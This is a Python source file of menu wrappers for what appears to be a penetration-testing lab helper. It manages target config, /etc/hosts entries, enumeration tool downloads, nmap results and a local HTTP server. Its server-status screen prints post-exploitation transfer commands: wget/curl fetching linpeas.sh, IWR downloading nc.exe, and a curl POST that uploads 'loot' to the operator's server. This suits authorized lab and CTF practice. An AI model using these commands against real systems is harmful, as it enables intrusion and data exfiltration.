"""
wrappers.py - Action wrappers for menu system
Thin wrapper functions that connect menu items to actual functionality
"""

import sys
from ..config import Colors
from ..actions.update_lab import (
    edit_field,
    quick_ip_update,
    view_config,
    add_fqdn,
    remove_fqdn,
    list_fqdns,
)
from ..actions.manage_host import (
    update_hosts,
    remove_from_hosts,
    view_hosts_entries,
)
from ..actions.download_lin import (
    download_linux_tools,
    list_linux_tools,
    remove_linux_tools,
)
from ..actions.download_win import (
    download_windows_tools,
    list_windows_tools,
    remove_windows_tools,
)
from ..actions.download_ad import (
    download_ad_tools,
    list_ad_tools,
    remove_ad_tools,
)

from ..actions.server import (
    start_lab_server,
    stop_lab_server,
    restart_lab_server,
    get_server_status,
    is_server_running,
    view_server_log
)


# ======================
#   CONFIG ACTIONS
# ======================

def wrap_quick_ip_update(config):
    """Wrapper for quick IP update"""
    quick_ip_update()


def wrap_view_config(config):
    """Wrapper for viewing config"""
    view_config()


def wrap_edit_metadata_field(config):
    """Wrapper for editing metadata fields"""
    print(f"\n{Colors.CYAN}Available metadata fields:{Colors.NC}")
    print(f"  name, platform, season, week, year, conference, location, etc.")
    
    field = input(f"\n{Colors.YELLOW}Enter field name to edit: {Colors.NC}").strip()
    
    if field:
        edit_field("metadata", field)
    else:
        print(f"{Colors.RED}[!] No field specified{Colors.NC}")


def wrap_edit_network_field(config):
    """Wrapper for editing network fields"""
    print(f"\n{Colors.CYAN}Available network fields:{Colors.NC}")
    print(f"  ip_address, domain, domain_name, domain_controller")
    
    field = input(f"\n{Colors.YELLOW}Enter field name to edit: {Colors.NC}").strip()
    
    if field:
        edit_field("network", field)
    else:
        print(f"{Colors.RED}[!] No field specified{Colors.NC}")


def wrap_edit_credentials_field(config):
    """Wrapper for editing credential fields"""
    print(f"\n{Colors.CYAN}Available credential fields:{Colors.NC}")
    print(f"  username, password")
    
    field = input(f"\n{Colors.YELLOW}Enter field name to edit: {Colors.NC}").strip()
    
    if field:
        edit_field("credentials", field)
    else:
        print(f"{Colors.RED}[!] No field specified{Colors.NC}")


def wrap_add_fqdn(config):
    """Wrapper for adding FQDN"""
    add_fqdn()


def wrap_remove_fqdn(config):
    """Wrapper for removing FQDN"""
    remove_fqdn()


def wrap_list_fqdns(config):
    """Wrapper for listing FQDNs"""
    list_fqdns()


# ======================
#   HOSTS ACTIONS
# ======================

def wrap_update_hosts(config):
    """Wrapper for updating /etc/hosts"""
    update_hosts()


def wrap_remove_hosts(config):
    """Wrapper for removing from /etc/hosts"""
    remove_from_hosts()


def wrap_view_hosts(config):
    """Wrapper for viewing hosts entries"""
    view_hosts_entries()


# ======================
#   SERVER ACTIONS
# ======================

def wrap_start_server(config):
    """Start HTTP server"""
    print(f"\n{Colors.YELLOW}[*] Server start not implemented yet{Colors.NC}")
    print(f"{Colors.CYAN}Coming soon: Will start HTTP server for lab{Colors.NC}")


def wrap_stop_server(config):
    """Stop HTTP server"""
    print(f"\n{Colors.YELLOW}[*] Server stop not implemented yet{Colors.NC}")
    print(f"{Colors.CYAN}Coming soon: Will stop running server{Colors.NC}")


def wrap_restart_server(config):
    """Restart HTTP server"""
    print(f"\n{Colors.YELLOW}[*] Server restart not implemented yet{Colors.NC}")
    print(f"{Colors.CYAN}Coming soon: Will restart server with new config{Colors.NC}")


def wrap_server_status(config):
    """Show detailed server status"""
    print(f"\n{Colors.YELLOW}[*] Server status not implemented yet{Colors.NC}")
    print(f"{Colors.CYAN}Coming soon: Will show server logs and stats{Colors.NC}")


# ======================
#   SCANNING ACTIONS
# ======================

def wrap_run_initial_scan(config):
    """Run initial nmap scan"""
    print(f"\n{Colors.YELLOW}[*] Initial scan not implemented yet{Colors.NC}")
    print(f"{Colors.CYAN}Coming soon: Will run quick nmap scan{Colors.NC}")


def wrap_run_full_scan(config):
    """Run full nmap scan"""
    print(f"\n{Colors.YELLOW}[*] Full scan not implemented yet{Colors.NC}")
    print(f"{Colors.CYAN}Coming soon: Will run comprehensive nmap scan{Colors.NC}")


def wrap_run_udp_scan(config):
    """Run UDP scan"""
    print(f"\n{Colors.YELLOW}[*] UDP scan not implemented yet{Colors.NC}")
    print(f"{Colors.CYAN}Coming soon: Will run UDP port scan{Colors.NC}")


def wrap_view_scan_results(config):
    """View scan results"""
    from ..core.context import find_lab_root
    from datetime import datetime
    
    lab_root = find_lab_root()
    scan_dir = lab_root / "scans" / "nmap"
    
    if not scan_dir.exists() or not any(scan_dir.glob("*.txt")):
        print(f"\n{Colors.YELLOW}[!] No scan results found{Colors.NC}")
        return
    
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.CYAN}║         Recent Scans                     ║{Colors.NC}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    scans = sorted(scan_dir.glob("*.txt"), key=lambda x: x.stat().st_mtime, reverse=True)
    
    for i, scan in enumerate(scans[:10], 1):
        size = scan.stat().st_size
        mtime = scan.stat().st_mtime
        time_str = datetime.fromtimestamp(mtime).strftime('%Y-%m-%d %H:%M')
        
        print(f"  {Colors.GREEN}[{i}]{Colors.NC} {scan.name}")
        print(f"      {Colors.YELLOW}{time_str} • {size} bytes{Colors.NC}")


# ======================
#   TOOLS ACTIONS
# ======================

def wrap_download_linux_tools(config):
    """Download Linux tools"""
    print(f"\n{Colors.CYAN}[*] Downloading Linux enumeration tools...{Colors.NC}")
    
    # Ask if user wants to force re-download
    print(f"\n{Colors.YELLOW}Re-download existing files? (y/n):{Colors.NC} ", end="")
    force = input().strip().lower() == 'y'
    
    try:
        download_linux_tools(force=force)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error downloading Linux tools: {e}{Colors.NC}")


def wrap_download_windows_tools(config):
    """Download Windows tools"""
    print(f"\n{Colors.CYAN}[*] Downloading Windows enumeration tools...{Colors.NC}")
    
    # Ask if user wants to force re-download
    print(f"\n{Colors.YELLOW}Re-download existing files? (y/n):{Colors.NC} ", end="")
    force = input().strip().lower() == 'y'
    
    try:
        download_windows_tools(force=force)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error downloading Windows tools: {e}{Colors.NC}")


def wrap_download_ad_tools(config):
    """Download AD tools"""
    print(f"\n{Colors.CYAN}[*] Downloading Active Directory enumeration tools...{Colors.NC}")
    
    # Ask if user wants to force re-download
    print(f"\n{Colors.YELLOW}Re-download existing files? (y/n):{Colors.NC} ", end="")
    force = input().strip().lower() == 'y'
    
    try:
        download_ad_tools(force=force)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error downloading AD tools: {e}{Colors.NC}")


def wrap_download_all_tools(config):
    """Download all tools"""
    print(f"\n{Colors.CYAN}[*] Downloading ALL enumeration tools...{Colors.NC}")
    print(f"{Colors.YELLOW}[*] This will download Linux, Windows, and AD tools{Colors.NC}\n")
    
    # Ask if user wants to force re-download
    print(f"{Colors.YELLOW}Re-download existing files? (y/n):{Colors.NC} ", end="")
    force = input().strip().lower() == 'y'
    
    try:
        print(f"\n{Colors.BLUE}[1/3] Linux Tools{Colors.NC}")
        download_linux_tools(force=force)
        
        print(f"\n{Colors.BLUE}[2/3] Windows Tools{Colors.NC}")
        download_windows_tools(force=force)
        
        print(f"\n{Colors.BLUE}[3/3] Active Directory Tools{Colors.NC}")
        download_ad_tools(force=force)
        
        print(f"\n{Colors.GREEN}╔══════════════════════════════════════════╗{Colors.NC}")
        print(f"{Colors.GREEN}║     All Tools Downloaded!                ║{Colors.NC}")
        print(f"{Colors.GREEN}╚══════════════════════════════════════════╝{Colors.NC}")
        
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error downloading tools: {e}{Colors.NC}")


def wrap_list_tools(config):
    """List available tools"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Tool Status Overview             ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}")
    
    try:
        # Show all three categories
        list_linux_tools()
        list_windows_tools()
        list_ad_tools()
        
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error listing tools: {e}{Colors.NC}")


def wrap_remove_tools_menu(config):
    """Show submenu for removing tools"""
    print(f"\n{Colors.CYAN}Remove which tools?{Colors.NC}")
    print(f"  {Colors.GREEN}[1]{Colors.NC} Linux tools")
    print(f"  {Colors.GREEN}[2]{Colors.NC} Windows tools")
    print(f"  {Colors.GREEN}[3]{Colors.NC} AD tools")
    print(f"  {Colors.GREEN}[4]{Colors.NC} All tools")
    print(f"  {Colors.GREEN}[c]{Colors.NC} Cancel")
    
    choice = input(f"\n{Colors.YELLOW}Choice: {Colors.NC}").strip().lower()
    
    try:
        if choice == '1':
            remove_linux_tools()
        elif choice == '2':
            remove_windows_tools()
        elif choice == '3':
            remove_ad_tools()
        elif choice == '4':
            print(f"\n{Colors.RED}[!] WARNING: This will remove ALL tools{Colors.NC}")
            print(f"{Colors.YELLOW}Continue? (y/n):{Colors.NC} ", end="")
            if input().strip().lower() == 'y':
                total = 0
                total += remove_linux_tools()
                total += remove_windows_tools()
                total += remove_ad_tools()
                print(f"\n{Colors.GREEN}[+] Removed {total} total tools{Colors.NC}")
        elif choice == 'c':
            print(f"{Colors.YELLOW}[*] Cancelled{Colors.NC}")
        else:
            print(f"{Colors.RED}[!] Invalid choice{Colors.NC}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error removing tools: {e}{Colors.NC}")


# ======================
#   UTILITY ACTIONS
# ======================

def wrap_open_notes(config):
    """Open notes directory"""
    from ..core.context import find_lab_root
    import subprocess
    
    lab_root = find_lab_root()
    notes_dir = lab_root / "notes"
    
    print(f"\n{Colors.CYAN}[*] Opening notes directory...{Colors.NC}")
    
    try:
        subprocess.run(['xdg-open', str(notes_dir)])
        print(f"{Colors.GREEN}[+] Opened {notes_dir}{Colors.NC}")
    except Exception as e:
        print(f"{Colors.YELLOW}[!] Could not auto-open: {e}{Colors.NC}")
        print(f"{Colors.CYAN}Notes location: {notes_dir}{Colors.NC}")


def wrap_open_scans(config):
    """Open scans directory"""
    from ..core.context import find_lab_root
    import subprocess
    
    lab_root = find_lab_root()
    scans_dir = lab_root / "scans"
    
    print(f"\n{Colors.CYAN}[*] Opening scans directory...{Colors.NC}")
    
    try:
        subprocess.run(['xdg-open', str(scans_dir)])
        print(f"{Colors.GREEN}[+] Opened {scans_dir}{Colors.NC}")
    except Exception as e:
        print(f"{Colors.YELLOW}[!] Could not auto-open: {e}{Colors.NC}")
        print(f"{Colors.CYAN}Scans location: {scans_dir}{Colors.NC}")


def wrap_show_lab_info(config):
    """Show complete lab information"""
    from ..core.context import find_lab_root
    
    lab_root = find_lab_root()
    
    print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.CYAN}║         Lab Information                  ║{Colors.NC}")
    print(f"{Colors.CYAN}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    print(f"{Colors.GREEN}Location:{Colors.NC} {lab_root}")
    print(f"{Colors.GREEN}Name:{Colors.NC} {config['metadata'].get('name', 'Unknown')}")
    print(f"{Colors.GREEN}Platform:{Colors.NC} {config['metadata'].get('platform', 'Unknown')}")
    print(f"{Colors.GREEN}Type:{Colors.NC} {config['metadata'].get('type', 'Unknown')}")
    
    created = config['metadata'].get('created')
    if created:
        print(f"{Colors.GREEN}Created:{Colors.NC} {created}")
    
    target_ip = config['network'].get('ip_address')
    if target_ip:
        print(f"{Colors.GREEN}Target IP:{Colors.NC} {target_ip}")
    
    fqdns = config['network'].get('fqdn', [])
    if fqdns:
        print(f"\n{Colors.GREEN}FQDNs:{Colors.NC}")
        for fqdn in fqdns:
            print(f"  • {fqdn}")




# ======================
#   SERVER ACTIONS
# ======================

def wrap_start_server(config):
    """Start HTTP server"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Start HTTP Server                ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if already running
    if is_server_running():
        status = get_server_status()
        print(f"{Colors.YELLOW}[!] Server is already running on port {status['port']}{Colors.NC}")
        print(f"\n{Colors.CYAN}Use 'Stop Server' or 'Restart Server' from the menu{Colors.NC}")
        return
    
    # Prompt for port
    port_input = input(f"{Colors.CYAN}Enter port [{Colors.YELLOW}8080{Colors.CYAN}]: {Colors.NC}").strip()
    port = int(port_input) if port_input.isdigit() else 8080
    
    # Start the server
    success = start_lab_server(port)
    
    if success:
        # Ask if user wants to view live log
        print(f"{Colors.CYAN}View live log? (y/n):{Colors.NC} ", end="")
        view_log = input().strip().lower()
        
        if view_log == 'y':
            print()  # Newline for cleaner display
            view_server_log(live=True)


def wrap_stop_server(config):
    """Stop HTTP server"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Stop HTTP Server                 ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if running
    if not is_server_running():
        print(f"{Colors.YELLOW}[!] No server is currently running{Colors.NC}")
        return
    
    # Get current status
    status = get_server_status()
    
    print(f"{Colors.CYAN}Server Status:{Colors.NC}")
    print(f"  Port: {Colors.YELLOW}{status['port']}{Colors.NC}")
    print(f"  PID:  {Colors.YELLOW}{status['pid']}{Colors.NC}")
    
    if status['uptime']:
        minutes = int(status['uptime'].total_seconds() / 60)
        print(f"  Uptime: {Colors.YELLOW}{minutes} minutes{Colors.NC}")
    
    # Confirm shutdown
    print(f"\n{Colors.YELLOW}Stop the server? (y/n):{Colors.NC} ", end="")
    confirm = input().strip().lower()
    
    if confirm == 'y':
        print()  # Newline for cleaner display
        stop_lab_server()
    else:
        print(f"{Colors.YELLOW}[*] Cancelled{Colors.NC}")


def wrap_restart_server(config):
    """Restart HTTP server"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Restart HTTP Server              ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if running
    if not is_server_running():
        print(f"{Colors.YELLOW}[!] No server is currently running{Colors.NC}")
        print(f"{Colors.CYAN}[*] Starting new server instead...{Colors.NC}\n")
        wrap_start_server(config)
        return
    
    # Get current status
    status = get_server_status()
    current_port = status.get('port', 8080)
    
    print(f"{Colors.CYAN}Current port: {Colors.YELLOW}{current_port}{Colors.NC}\n")
    
    # Ask if user wants to change port
    print(f"{Colors.CYAN}Change port? (y/n):{Colors.NC} ", end="")
    change_port = input().strip().lower()
    
    new_port = None
    if change_port == 'y':
        port_input = input(f"\n{Colors.CYAN}Enter new port [{Colors.YELLOW}{current_port}{Colors.CYAN}]: {Colors.NC}").strip()
        new_port = int(port_input) if port_input.isdigit() else current_port
    
    print()  # Newline for cleaner display
    
    # Restart the server
    restart_lab_server(new_port)


def wrap_server_status(config):
    """Show detailed server status"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Server Status                    ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    status = get_server_status()
    
    # Display status
    if status['is_running']:
        print(f"{Colors.GREEN}Status:{Colors.NC}     {Colors.GREEN}● Running{Colors.NC}")
    else:
        print(f"{Colors.RED}Status:{Colors.NC}     {Colors.RED}○ Stopped{Colors.NC}")
    
    if status['port']:
        print(f"{Colors.GREEN}Port:{Colors.NC}       {Colors.YELLOW}{status['port']}{Colors.NC}")
    
    if status['ip']:
        print(f"{Colors.GREEN}IP:{Colors.NC}         {Colors.YELLOW}{status['ip']}{Colors.NC}")
        print(f"{Colors.GREEN}URL:{Colors.NC}        {Colors.CYAN}http://{status['ip']}:{status['port']}/{Colors.NC}")
    
    if status['pid']:
        print(f"{Colors.GREEN}PID:{Colors.NC}        {Colors.YELLOW}{status['pid']}{Colors.NC}")
    
    if status['uptime']:
        minutes = int(status['uptime'].total_seconds() / 60)
        hours = minutes // 60
        mins = minutes % 60
        
        if hours > 0:
            uptime_str = f"{hours}h {mins}m"
        else:
            uptime_str = f"{mins}m"
        
        print(f"{Colors.GREEN}Uptime:{Colors.NC}     {Colors.YELLOW}{uptime_str}{Colors.NC}")
    
    if status['log_file']:
        print(f"{Colors.GREEN}Log:{Colors.NC}        {Colors.CYAN}{status['log_file']}{Colors.NC}")
    
    # Show helpful commands if running
    if status['is_running']:
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗{Colors.NC}")
        print(f"{Colors.CYAN}║         Quick Commands                   ║{Colors.NC}")
        print(f"{Colors.CYAN}╚══════════════════════════════════════════╝{Colors.NC}\n")
        
        ip = status['ip']
        port = status['port']
        
        print(f"{Colors.YELLOW}Download file:{Colors.NC}")
        print(f"  wget http://{ip}:{port}/tools/linpeas.sh")
        print(f"  curl -O http://{ip}:{port}/tools/linpeas.sh")
        
        print(f"\n{Colors.YELLOW}Upload file:{Colors.NC}")
        print(f"  curl -X POST -F 'file=@data.txt' http://{ip}:{port}/upload/loot/data.txt")
        
        print(f"\n{Colors.YELLOW}Windows:{Colors.NC}")
        print(f"  IWR -Uri http://{ip}:{port}/tools/nc.exe -OutFile nc.exe")
    
    # Ask about viewing log
    if status['log_file']:
        print(f"\n{Colors.CYAN}View log? [l=live, r=recent, n=no]:{Colors.NC} ", end="")
        choice = input().strip().lower()
        
        if choice == 'l':
            print()  # Newline for cleaner display
            view_server_log(live=True)
        elif choice == 'r':
            print()  # Newline for cleaner display
            view_server_log(live=False)


def wrap_view_server_log(config):
    """View server log file"""
    print(f"\n{Colors.BLUE}╔══════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║         Server Log                       ║{Colors.NC}")
    print(f"{Colors.BLUE}╚══════════════════════════════════════════╝{Colors.NC}\n")
    
    # Check if server has ever run
    status = get_server_status()
    
    if not status['log_file']:
        print(f"{Colors.YELLOW}[!] No log file found{Colors.NC}")
        print(f"{Colors.CYAN}[*] Server has not been started yet{Colors.NC}")
        return
    
    # Ask for live or recent
    print(f"{Colors.CYAN}View mode:{Colors.NC}")
    print(f"  {Colors.GREEN}[l]{Colors.NC} Live (tail -f)")
    print(f"  {Colors.GREEN}[r]{Colors.NC} Recent (last 50 lines)")
    
    choice = input(f"\n{Colors.YELLOW}Choice [l]:{Colors.NC} ").strip().lower() or 'l'
    
    print()  # Newline for cleaner display
    
    if choice == 'l':
        view_server_log(live=True)
    elif choice == 'r':
        view_server_log(live=False)
    else:
        print(f"{Colors.YELLOW}[*] Invalid choice{Colors.NC}")